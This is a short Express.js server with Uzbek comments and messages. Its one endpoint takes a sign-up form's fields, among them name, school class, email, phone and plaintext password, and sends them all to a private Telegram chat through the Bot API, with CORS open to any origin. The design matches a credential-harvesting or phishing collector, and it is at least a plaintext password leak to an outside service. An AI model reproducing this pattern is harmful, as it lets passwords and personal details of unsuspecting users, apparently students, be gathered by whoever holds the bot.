import express from "express";
import cors from "cors";
import dotenv from "dotenv";

dotenv.config();

const app = express();

/* ✅ CORS FIX (Vercel + Render uchun) */
app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST"],
  })
);

app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

/* 🔥 health check */
app.get("/", (req, res) => {
  res.send("Server ishlayapti 🚀");
});

/* 📩 Telegram send */
app.post("/sendMessage", async (req, res) => {
  try {
    const {
      name,
      surname,
      className,
      email,
      phone,
      password,
      passwordLevel,
    } = req.body;

    const text = `
🆕 Yangi foydalanuvchi

👤 Ism: ${name || "-"}
👤 Familiya: ${surname || "-"}
🏫 Sinf: ${className || "-"}

📧 Email: ${email || "-"}
📱 Telefon: ${phone || "-"}

🔐 Parol: ${password || "-"}
⚡ Daraja: ${passwordLevel || "-"}
`;

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text,
        }),
      }
    );

    const data = await response.json();

    if (!data.ok) {
      return res.status(400).json({
        success: false,
        telegram: data,
      });
    }

    return res.json({
      success: true,
    });
  } catch (err) {
    console.error("ERROR:", err);

    return res.status(500).json({
      success: false,
      message: err.message,
    });
  }
});

/* 🚀 PORT */
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Server ishlayapti: ${PORT}`);
});